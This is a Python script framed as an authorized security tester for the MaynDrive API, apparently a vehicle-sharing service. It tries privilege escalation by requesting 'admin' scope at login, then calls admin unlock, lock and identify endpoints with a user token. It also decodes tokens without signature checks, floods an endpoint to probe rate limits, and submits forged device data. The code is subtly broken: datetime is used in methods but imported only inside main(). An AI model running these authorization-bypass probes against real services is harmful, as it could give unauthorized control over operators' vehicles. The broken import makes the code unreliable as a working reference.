"""
Security Vulnerability Testing Script for MaynDrive API
Tests for admin access escalation and authorization bypasses

⚠️ WARNING: Only run this against your own test environment or with explicit permission!
"""

import sys
from typing import Dict, List, Tuple
from mayn_drive_api import MaynDriveAPI
import json


class SecurityTester:
    """Test suite for security vulnerabilities"""
    
    def __init__(self, test_email: str, test_password: str):
        self.test_email = test_email
        self.test_password = test_password
        self.results = []
        
    def log_result(self, test_name: str, vulnerable: bool, details: str, severity: str):
        """Log test result"""
        result = {
            'test': test_name,
            'vulnerable': vulnerable,
            'severity': severity,
            'details': details
        }
        self.results.append(result)
        
        status = "🚨 VULNERABLE" if vulnerable else "✅ SECURE"
        print(f"\n{status} [{severity}]: {test_name}")
        print(f"Details: {details}")
        
    def test_scope_escalation(self) -> bool:
        """
        Test 1: Client-Controlled Scope Escalation
        
        Checks if a regular user can request admin scope during login
        """
        print("\n" + "="*70)
        print("TEST 1: Scope Escalation Vulnerability")
        print("="*70)
        
        api = MaynDriveAPI()
        
        # Try to login with admin scope
        print("\n→ Attempting login with scope='admin'...")
        success, data = api.login(self.test_email, self.test_password, scope="admin")
        
        if not success:
            self.log_result(
                "Scope Escalation",
                False,
                "Login with admin scope was rejected",
                "CRITICAL"
            )
            return False
        
        # Check if we got a token
        if not api.access_token:
            self.log_result(
                "Scope Escalation",
                False,
                "No access token received",
                "CRITICAL"
            )
            return False
        
        print(f"✓ Login successful with token: {api.access_token[:20]}...")
        
        # Try to access an admin endpoint
        print("\n→ Testing admin endpoint access...")
        success, unlock_data = api.unlock_vehicle_admin(
            serial_number="SECURITY_TEST_123",
            latitude=0.0,
            longitude=0.0,
            force=False
        )
        
        if success:
            self.log_result(
                "Scope Escalation",
                True,
                "CRITICAL: Regular user successfully accessed admin endpoint by requesting admin scope!",
                "CRITICAL"
            )
            return True
        elif unlock_data.get('status_code') == 404:
            # Vehicle not found, but endpoint was accessible
            self.log_result(
                "Scope Escalation",
                True,
                "WARNING: Admin endpoint was accessible (404 = vehicle not found, not 403 Forbidden)",
                "CRITICAL"
            )
            return True
        elif unlock_data.get('status_code') == 403:
            self.log_result(
                "Scope Escalation",
                False,
                "Admin endpoint properly rejected access (403 Forbidden)",
                "CRITICAL"
            )
            return False
        else:
            self.log_result(
                "Scope Escalation",
                None,
                f"Unclear result: {unlock_data}",
                "CRITICAL"
            )
            return False
    
    def test_admin_endpoint_without_admin_scope(self) -> bool:
        """
        Test 2: Direct Admin Endpoint Access
        
        Checks if admin endpoints can be accessed with regular user token
        """
        print("\n" + "="*70)
        print("TEST 2: Direct Admin Endpoint Access")
        print("="*70)
        
        api = MaynDriveAPI()
        
        # Login with user scope
        print("\n→ Logging in with scope='user'...")
        success, data = api.login(self.test_email, self.test_password, scope="user")
        
        if not success:
            print("✗ Login failed")
            return False
        
        print(f"✓ Login successful with user scope")
        
        # Test multiple admin endpoints
        admin_endpoints = [
            ("Admin Unlock", lambda: api.unlock_vehicle_admin("TEST", 0.0, 0.0)),
            ("Admin Vehicle Info", lambda: api.get_vehicle_info("TEST", admin=True)),
            ("Admin Refresh", lambda: api.refresh_vehicle_admin("TEST")),
            ("Admin Lock", lambda: api.lock_vehicle_admin("TEST", 0.0, 0.0)),
            ("Admin Identify", lambda: api.identify_vehicle_admin("TEST")),
        ]
        
        vulnerabilities = []
        
        for endpoint_name, endpoint_func in admin_endpoints:
            print(f"\n→ Testing {endpoint_name}...")
            try:
                success, result = endpoint_func()
                
                if success:
                    vulnerabilities.append(f"{endpoint_name}: Fully accessible")
                    print(f"  🚨 VULNERABLE: Endpoint fully accessible!")
                elif result.get('status_code') == 404:
                    vulnerabilities.append(f"{endpoint_name}: Endpoint accessible (404)")
                    print(f"  ⚠️  WARNING: Endpoint accessible (404 = not found, not 403)")
                elif result.get('status_code') == 403:
                    print(f"  ✅ SECURE: Access denied (403)")
                else:
                    print(f"  ❓ UNCLEAR: Status {result.get('status_code')}")
            except Exception as e:
                print(f"  ❌ ERROR: {str(e)}")
        
        if vulnerabilities:
            self.log_result(
                "Admin Endpoint Access",
                True,
                f"User token allowed access to: {', '.join(vulnerabilities)}",
                "HIGH"
            )
            return True
        else:
            self.log_result(
                "Admin Endpoint Access",
                False,
                "All admin endpoints properly reject user tokens",
                "HIGH"
            )
            return False
    
    def test_token_scope_validation(self) -> bool:
        """
        Test 3: Token Scope Validation
        
        Checks if the scope in the token is properly validated
        """
        print("\n" + "="*70)
        print("TEST 3: Token Scope Validation")
        print("="*70)
        
        api = MaynDriveAPI()
        
        # Login normally
        print("\n→ Logging in normally...")
        success, data = api.login(self.test_email, self.test_password, scope="user")
        
        if not success:
            print("✗ Login failed")
            return False
        
        original_token = api.access_token
        print(f"✓ Got token: {original_token[:20]}...")
        
        # Try to decode token (without verification)
        try:
            import jwt
            payload = jwt.decode(original_token, options={"verify_signature": False})
            print(f"\n→ Token payload: {json.dumps(payload, indent=2)}")
            
            if 'scope' in payload or 'role' in payload or 'roles' in payload:
                self.log_result(
                    "Token Scope Validation",
                    None,
                    f"Token contains scope/role claim. Manual inspection needed: {payload}",
                    "MEDIUM"
                )
            else:
                self.log_result(
                    "Token Scope Validation",
                    None,
                    "Token does not contain visible scope/role claim. Server-side validation unknown.",
                    "MEDIUM"
                )
        except ImportError:
            print("⚠️  PyJWT not installed, skipping token decode test")
            self.log_result(
                "Token Scope Validation",
                None,
                "Could not test - PyJWT library required",
                "MEDIUM"
            )
        except Exception as e:
            print(f"⚠️  Error decoding token: {e}")
            self.log_result(
                "Token Scope Validation",
                None,
                f"Error during token decode: {str(e)}",
                "MEDIUM"
            )
        
        return False
    
    def test_rate_limiting(self) -> bool:
        """
        Test 4: Rate Limiting on Admin Endpoints
        
        Checks if admin endpoints have rate limiting
        """
        print("\n" + "="*70)
        print("TEST 4: Rate Limiting")
        print("="*70)
        
        api = MaynDriveAPI()
        
        # Login
        print("\n→ Logging in...")
        success, data = api.login(self.test_email, self.test_password, scope="admin")
        
        if not success:
            print("✗ Login failed")
            return False
        
        # Make multiple rapid requests
        print("\n→ Making 20 rapid requests to admin endpoint...")
        rate_limited = False
        success_count = 0
        
        for i in range(20):
            success, result = api.get_vehicle_info("TEST", admin=True)
            
            if result.get('status_code') == 429:
                rate_limited = True
                print(f"  Request {i+1}: Rate limited!")
                break
            elif result.get('status_code') in [200, 404]:
                success_count += 1
            
            print(f"  Request {i+1}: Status {result.get('status_code', 'N/A')}", end='\r')
        
        print()  # New line
        
        if not rate_limited:
            self.log_result(
                "Rate Limiting",
                True,
                f"No rate limiting detected after {success_count} requests",
                "HIGH"
            )
            return True
        else:
            self.log_result(
                "Rate Limiting",
                False,
                "Rate limiting is implemented",
                "HIGH"
            )
            return False
    
    def test_mfa_requirement(self) -> bool:
        """
        Test 5: MFA Requirement for Admin Accounts
        
        Checks if admin accounts require MFA
        """
        print("\n" + "="*70)
        print("TEST 5: MFA Requirement")
        print("="*70)
        
        api = MaynDriveAPI()
        
        # Login with admin scope
        print("\n→ Logging in with admin scope...")
        success, data = api.login(self.test_email, self.test_password, scope="admin")
        
        if not success:
            print("✗ Login failed")
            return False
        
        # Check if MFA was required
        if data.get('requires_mfa') or data.get('mfa_required'):
            self.log_result(
                "MFA Requirement",
                False,
                "MFA is required for admin login",
                "MEDIUM"
            )
            return False
        else:
            self.log_result(
                "MFA Requirement",
                True,
                "Admin login succeeded without MFA challenge",
                "MEDIUM"
            )
            return True
    
    def test_device_validation(self) -> bool:
        """
        Test 6: Device Validation
        
        Checks if arbitrary device information is accepted
        """
        print("\n" + "="*70)
        print("TEST 6: Device Validation")
        print("="*70)
        
        api = MaynDriveAPI()
        
        # Try login with obviously fake device info
        print("\n→ Attempting login with fake device information...")
        
        # The login method generates device info - we need to test this manually
        import requests
        import uuid
        
        fake_device = {
            "uuid": "00000000-0000-0000-0000-000000000000",
            "platform": "fake_os",
            "manufacturer": "HACKER_INC",
            "model": "Security Test Device",
            "os_version": "99.9",
            "app_version": "0.0.1"
        }
        
        payload = {
            "email": self.test_email,
            "password": self.test_password,
            "device": fake_device,
            "scope": "user",
            "app_label": "mayndrive"
        }
        
        try:
            response = requests.post(
                f"{api.base_url}/api/application/login",
                json=payload,
                headers={
                    'User-Agent': 'SecurityTest/1.0',
                    'Content-Type': 'application/json'
                },
                timeout=30
            )
            
            if response.status_code == 200:
                self.log_result(
                    "Device Validation",
                    True,
                    "Arbitrary device information was accepted",
                    "MEDIUM"
                )
                return True
            else:
                self.log_result(
                    "Device Validation",
                    False,
                    f"Fake device was rejected (status {response.status_code})",
                    "MEDIUM"
                )
                return False
        except Exception as e:
            print(f"⚠️  Error testing device validation: {e}")
            return False
    
    def run_all_tests(self):
        """Run all security tests"""
        print("""
        ╔═══════════════════════════════════════════════════════════╗
        ║     MaynDrive API Security Vulnerability Testing         ║
        ║                                                            ║
        ║  ⚠️  WARNING: Only test on your own environment!          ║
        ╚═══════════════════════════════════════════════════════════╝
        """)
        
        print(f"\nTesting account: {self.test_email}")
        print(f"Timestamp: {datetime.now()}")
        
        # Run all tests
        self.test_scope_escalation()
        self.test_admin_endpoint_without_admin_scope()
        self.test_token_scope_validation()
        self.test_rate_limiting()
        self.test_mfa_requirement()
        self.test_device_validation()
        
        # Generate report
        self.generate_report()
    
    def generate_report(self):
        """Generate security test report"""
        print("\n" + "="*70)
        print("SECURITY TEST SUMMARY")
        print("="*70)
        
        critical = [r for r in self.results if r['vulnerable'] and r['severity'] == 'CRITICAL']
        high = [r for r in self.results if r['vulnerable'] and r['severity'] == 'HIGH']
        medium = [r for r in self.results if r['vulnerable'] and r['severity'] == 'MEDIUM']
        
        total_vulnerable = len(critical) + len(high) + len(medium)
        
        print(f"\n🚨 Critical Vulnerabilities: {len(critical)}")
        for result in critical:
            print(f"   - {result['test']}: {result['details']}")
        
        print(f"\n⚠️  High Vulnerabilities: {len(high)}")
        for result in high:
            print(f"   - {result['test']}: {result['details']}")
        
        print(f"\n⚡ Medium Vulnerabilities: {len(medium)}")
        for result in medium:
            print(f"   - {result['test']}: {result['details']}")
        
        print(f"\n{'='*70}")
        print(f"TOTAL VULNERABILITIES FOUND: {total_vulnerable}")
        
        if total_vulnerable > 0:
            print("\n🚨 ACTION REQUIRED: Review SECURITY_ANALYSIS.md for remediation steps!")
        else:
            print("\n✅ No vulnerabilities detected in automated tests")
            print("   (Manual review still recommended)")
        
        print(f"{'='*70}\n")
        
        # Save report to file
        with open('security_test_report.json', 'w') as f:
            json.dump({
                'timestamp': str(datetime.now()),
                'test_account': self.test_email,
                'results': self.results,
                'summary': {
                    'critical': len(critical),
                    'high': len(high),
                    'medium': len(medium),
                    'total': total_vulnerable
                }
            }, f, indent=2)
        
        print("📄 Detailed report saved to: security_test_report.json\n")


def main():
    """Main test function"""
    from datetime import datetime
    
    print("""
    ╔═══════════════════════════════════════════════════════════╗
    ║   MaynDrive API - Security Vulnerability Testing         ║
    ║                                                            ║
    ║   ⚠️  WARNING: Only run against test environments!        ║
    ║   Running these tests may:                                ║
    ║   - Trigger security alerts                               ║
    ║   - Result in account suspension                          ║
    ║   - Be considered unauthorized testing                    ║
    ║                                                            ║
    ║   Ensure you have permission before proceeding!           ║
    ╚═══════════════════════════════════════════════════════════╝
    """)
    
    consent = input("\nDo you have permission to test this system? (yes/no): ")
    if consent.lower() != 'yes':
        print("\n❌ Testing cancelled. Obtain proper authorization first.")
        sys.exit(0)
    
    # Get credentials
    print("\nEnter test account credentials:")
    email = input("Email: ")
    password = input("Password: ")
    
    if not email or not password:
        print("❌ Email and password are required!")
        sys.exit(1)
    
    # Create tester and run tests
    tester = SecurityTester(email, password)
    tester.run_all_tests()


if __name__ == "__main__":
    main()





